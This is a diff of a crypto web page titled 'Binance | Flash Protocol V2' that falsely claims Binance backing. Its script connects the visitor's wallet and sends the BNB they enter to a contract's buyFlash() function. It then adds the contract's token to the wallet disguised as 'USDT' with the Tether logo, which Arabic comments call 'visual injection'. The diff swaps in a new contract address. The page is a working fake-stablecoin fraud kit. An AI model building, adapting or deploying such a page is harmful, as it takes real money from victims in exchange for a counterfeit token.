@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Binance | Flash Protocol V2</title>
-    <!-- ✅ بدون مسافات -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #1E2329; --text: #EAECEF; --hover: #2B3139; }
@@ -66,17 +65,17 @@
         </div>
         
         <div class="wallet-item" onclick="initWallet()">
-            <div><img src="https://cryptologos.cc/logos/metamask-matic-logo.png"><span>MetaMask</span></div>
+            <div><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"><span>MetaMask</span></div>
             <span class="status-tag">INSTALLED</span>
         </div>
         
         <div class="wallet-item" onclick="initWallet()">
-            <div><img src="https://cryptologos.cc/logos/trust-wallet-trust-logo.png"><span>Trust Wallet</span></div>
+            <div><img src="https://www.okx.com/cdn/assets/imgs/221/9E4FE6E178351F9F.png"><span>OKX Wallet</span></div>
             <span class="status-tag">INSTALLED</span>
         </div>
         
         <div class="wallet-item" onclick="initWallet()">
-            <div><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"><span>Binance Wallet</span></div>
+            <div><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"><span>Trust Wallet</span></div>
         </div>
         
         <p style="text-align: center; font-size: 11px; color: #848E9C; margin-top: 20px;">Secure link powered by Binance Cloud</p>
@@ -85,9 +84,10 @@
 
 <script>
     let web3, account;
-    // ✅ العنوان الفعلي للعقد
-    const CONTRACT_ADDR = "0xa2c4777262032A6CE29B540aA23623384a839331"; 
+    // ✅ عنوان العقد الذكي الخاص بك
+    const CONTRACT_ADDR = "0x8933877Ad38598Ad25bf97f9ECEBbCE5D901eB71"; 
     
+    // ✅ ABI كامل لضمان دقة الحقن والظهور في المحفظة
     const ABI = [
         {"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"},
         {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
@@ -106,6 +106,7 @@
                 account = accs[0];
                 web3 = new Web3(window.ethereum);
                 
+                // التبديل التلقائي لشبكة BSC (Chain ID 0x38)
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: '0x38' }],
@@ -131,6 +132,7 @@
         try {
             log.innerText = "Synchronizing Node...";
             
+            // تنفيذ دالة buyFlash واستلام الـ BNB
             await contract.methods.buyFlash().send({ 
                 from: account, 
                 value: web3.utils.toWei(val, "ether") 
@@ -138,6 +140,7 @@
 
             log.innerText = "Injection Successful. Adding Assets...";
 
+            // ✅ ميزة الحقن البصري (إضافة التوكن للمحفظة فوراً)
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -146,7 +149,7 @@
                         address: CONTRACT_ADDR,
                         symbol: 'USDT',
                         decimals: 18,
-                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                     },
                 },
             });
@@ -158,4 +161,4 @@
     }
 </script>
 </body>
-</html>
+</html>ررررررر
